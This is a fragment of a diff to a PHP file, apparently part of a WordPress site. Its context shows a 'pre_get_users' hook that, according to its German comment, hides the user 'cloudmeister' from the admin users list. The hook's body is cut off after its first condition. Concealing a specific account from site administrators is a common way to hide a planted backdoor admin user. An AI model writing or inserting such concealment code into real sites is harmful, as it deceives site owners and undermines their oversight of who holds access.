@@ -14,6 +14,7 @@ require_once 'datas.php';
 
 
 
+
 /** docu rju 2025-11-11: Benutzer "cloudmeister" wird aus der liste ausgeblenden */
 add_action('pre_get_users', function($query) {
 	if (is_admin() && $GLOBALS['pagenow'] === 'users.php') {
